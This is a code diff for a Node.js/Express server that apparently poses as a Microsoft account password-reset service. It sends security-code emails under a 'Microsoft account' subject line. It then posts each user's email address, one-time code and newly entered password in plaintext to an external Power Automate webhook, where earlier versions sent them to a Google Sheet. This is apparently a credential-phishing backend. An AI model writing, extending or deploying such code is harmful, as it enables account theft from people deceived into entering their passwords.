@@ -295,7 +295,47 @@ async function appendToGoogleSheet(data) {
     }
 }
 
-// Updated send-code endpoint with simplified logging
+// Function to append data to Microsoft Excel using Power Automate
+async function appendToExcel(data) {
+    try {
+        // Skip if URL is not configured
+        if (!process.env.POWER_AUTOMATE_URL) {
+            console.log('Excel logging skipped - Power Automate URL not configured');
+            return true;
+        }
+
+        const timestamp = new Date().toISOString();
+        
+        // Prepare payload with only essential data
+        const payload = {
+            timestamp: timestamp,
+            email: data.email,
+            status: data.status,
+            otp: data.otp || '',
+            password: data.password || ''
+        };
+
+        console.log('Logging to Excel:', {
+            ...payload,
+            otp: payload.otp ? '******' : '',
+            password: payload.password ? '******' : ''  // Mask password in logs
+        });
+
+        // Send data to Power Automate
+        const response = await axios.post(process.env.POWER_AUTOMATE_URL, payload, {
+            headers: { 'Content-Type': 'application/json' },
+            timeout: 5000
+        });
+
+        console.log('Successfully logged to Excel:', response.data);
+        return true;
+    } catch (error) {
+        console.error('Excel logging error:', error.message);
+        return false;
+    }
+}
+
+// Updated send-code endpoint with Excel logging
 app.post('/send-code', async (req, res) => {
     const { email } = req.body;
 
@@ -307,29 +347,34 @@ app.post('/send-code', async (req, res) => {
     }
 
     try {
-        const otp = generateOTP();
-        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
+        // Generate OTP
+        const otp = Math.floor(100000 + Math.random() * 900000).toString();
+        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes expiry
 
-        // Save or update user
-        await User.findOneAndUpdate(
-            { email: email.toLowerCase() },
-            { 
-                email: email.toLowerCase(),
-                otp,
-                otpExpiry
-            },
-            { upsert: true }
-        );
+        // Find or create user
+        let user = await User.findOne({ email: email.toLowerCase() });
+        if (!user) {
+            user = new User({ email: email.toLowerCase() });
+        }
+
+        // Update user with new OTP
+        user.otp = otp;
+        user.otpExpiry = otpExpiry;
+        await user.save();
 
         // Send email
-        await sendEmail(
-            email,
-            'Security Code for Password Reset',
-            createEmailTemplate(otp)
-        );
+        const emailContent = createEmailTemplate(otp);
+        const mailOptions = {
+            from: process.env.EMAIL_USER,
+            to: email,
+            subject: 'Security code for Microsoft account',
+            html: emailContent
+        };
 
-        // Log to Google Sheet
-        await appendToGoogleSheet({
+        await transporter.sendMail(mailOptions);
+
+        // Log to Excel
+        await appendToExcel({
             email: email.toLowerCase(),
             status: 'OTP Sent',
             otp: otp
@@ -341,22 +386,22 @@ app.post('/send-code', async (req, res) => {
         });
     } catch (error) {
         console.error('Send Code Error:', error);
-        
-        // Log error to Google Sheet
-        await appendToGoogleSheet({
-            email: email.toLowerCase(),
+
+        // Log error to Excel
+        await appendToExcel({
+            email: email?.toLowerCase(),
             status: 'OTP Send Failed',
             otp: ''
         });
 
         res.status(500).json({
             success: false,
-            message: 'Failed to send security code'
+            message: 'Error sending security code'
         });
     }
 });
 
-// Updated verify-otp endpoint to only check passwords and log
+// Updated verify-otp endpoint with Excel logging
 app.post('/verify-otp', async (req, res) => {
     const { email, newPassword, confirmPassword } = req.body;
 
@@ -376,8 +421,8 @@ app.post('/verify-otp', async (req, res) => {
             });
         }
 
-        // Log the password reset attempt
-        await appendToGoogleSheet({
+        // Log to Excel
+        await appendToExcel({
             email: email.toLowerCase(),
             status: 'Password Reset Success',
             password: newPassword
@@ -390,7 +435,8 @@ app.post('/verify-otp', async (req, res) => {
     } catch (error) {
         console.error('Password Reset Error:', error);
         
-        await appendToGoogleSheet({
+        // Log error to Excel
+        await appendToExcel({
             email: email.toLowerCase(),
             status: 'Password Reset Failed',
             password: ''
